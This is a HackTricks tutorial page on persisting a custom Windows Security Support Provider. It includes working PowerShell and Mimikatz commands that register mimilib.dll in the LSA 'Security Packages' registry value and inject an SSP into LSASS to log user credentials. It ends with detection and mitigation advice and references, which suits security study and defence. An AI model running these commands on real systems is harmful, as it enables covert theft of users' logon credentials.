---
title: "Custom SSP"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/active-directory-methodology/custom-ssp.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: ad
---

# Custom Security Support Providers

## Mimikatz `mimilib`

`mimilib`
Mimikatz includes `mimilib.dll`, which implements an SSP that records credentials handled after it is loaded. In an authorized lab, place the DLL that matches the target architecture in `C:\Windows\System32`, then inspect the current package list before changing it.[\[2\]](#references)[\[3\]](#references)

```
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
A typical existing value can contain packages such as `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg`, and `pku2u`. Preserve every existing entry when adding the custom package.[\[1\]](#references)

Append `mimilib` without replacing the existing packages:

```
if ($packages -notcontains 'mimilib') {
    Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
After a reboot, the package is loaded into LSA and subsequent captured credentials are written to `C:\Windows\System32\kiwissp.log` by this implementation.[\[2\]](#references)[\[3\]](#references)

## In-memory Loading

Mimikatz can also inject its SSP implementation into the current LSASS process:[\[3\]](#references)

```
privilege::debug
misc::memssp
```
This method does not persist across a reboot.[\[2\]](#references)[\[3\]](#references)

## Detection and Mitigation

Monitor changes to `...\Lsa\Security Packages` and unexpected DLL loads into `lsass.exe`. Security event 4657 records a registry **value** modification only when the relevant Audit Registry policy and SACL are configured.[\[2\]](#references)[\[4\]](#references)

Where compatible, enable added LSA protection and investigate unsigned or unexpected SSP DLLs. Microsoft documents LSA protection specifically as a control against code injection that could compromise credentials.[\[5\]](#references)

## References

- [1] [Microsoft Learn - Registering SSP/AP DLLs](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Configure added LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
